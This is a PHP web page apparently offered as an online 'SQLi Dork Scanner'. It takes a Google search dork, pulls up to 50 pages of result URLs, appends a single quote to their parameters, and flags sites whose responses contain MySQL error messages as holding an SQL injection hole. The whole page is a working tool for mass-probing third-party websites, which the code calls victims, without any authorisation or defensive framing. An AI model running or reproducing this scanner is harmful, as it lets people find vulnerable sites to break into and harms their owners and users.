<?php 
include('../../head.php');
?>
        <title>SQLi Dork Scanner Online</title>
<?php
function letItBy() {
    ob_flush();
    flush();
}
$browser = $_SERVER['HTTP_USER_AGENT'];
function google_that($query, $page = 1) {
    $resultPerPage = 8;
    $start = $page * $resultPerPage;
    $url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&hl=iw&rsz={$resultPerPage}&start={$start}&q=" . urlencode($query);
    $resultFromGoogle = json_decode(http_get($url, true), true);
    if (isset($resultFromGoogle['responseStatus'])) {
        if ($resultFromGoogle['responseStatus'] != '200') return false;
        if (sizeof($resultFromGoogle['responseData']['results']) == 0) return false;
        else return $resultFromGoogle['responseData']['results'];
    } else die('The function <b>' . __FUNCTION__ . '</b> Kill me :( <br>' . $url);
}
function http_get($url, $safemode = false) {
    if ($safemode === true) sleep(1);
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close();
}
function cekvenurabel($result) {
    $url = preg_replace("/=/", "='", $result);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, '$browser)');
    curl_setopt($curl, CURLOPT_TIMEOUT, '5');
    $GET = curl_exec($curl);
    if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row ()|SELECT *
FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i", $GET)) {
        echo '<center><b><font color="red">Found Sqli Exploit On ==> </font><a href="' . $url . '" target="_blank">' . $url . '</a> </b></center>';
        ob_flush();
        flush();
    } else {
        echo '<center><b>No Exploit On ==> </b><b>' . $url . '</b> </center>';
        ob_flush();
        flush();
    }
    ob_flush();
    flush();
}
if (isset($_POST['dork'] {
    0
})) {
    for ($googlePage = 1;$googlePage <= 50;$googlePage++) {
        $googleResult = google_that($_POST['dork'], $googlePage);
        if (!$googleResult) {
            echo '<h1><font color=#01DF01><center>Finished Finding...</center></font></h1>';
            break;
        }
        for ($victim = 0;$victim < sizeof($googleResult);$victim++) {
            $result = $googleResult[$victim]['unescapedUrl'];
            cekvenurabel($result);
            letItBy();
        }
    }
}
?>
<html>
<head>
<meta charset="UTF-8" http-equiv="Content-Type" content="text/html; charset=windows-1256" />
</head>
<body>
<center>
<!--/span-->
                    <div class="row-fluid">
                            <!-- block -->
                            <div class="block">
                                <div class="navbar navbar-inner block-header">
                                    <div><center><b>SQLi Dork Scanner Online</b></center></div>
                                </div>
                                <div class="block-content collapse in">
 <form method="post">
&nbsp;&nbsp;
  <input type="text" id="dork" class="dap_text_box" placeholder="inurl:order.php?id=" size="30" name="dork" value="<?php echo (isset($_POST['dork'] {
    0
})) ? htmlentities($_POST['dork']) : ''; ?>" />
  &nbsp;&nbsp;<br><br><center><input type="submit" class="btn btn-success" value="Submit" id="button"/></center>
 </form>
<script id="_waupw2">var _wau = _wau || [];
_wau.push(["tab", "u8tylhw1w8yn", "pw2", "right-upper"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>
</center>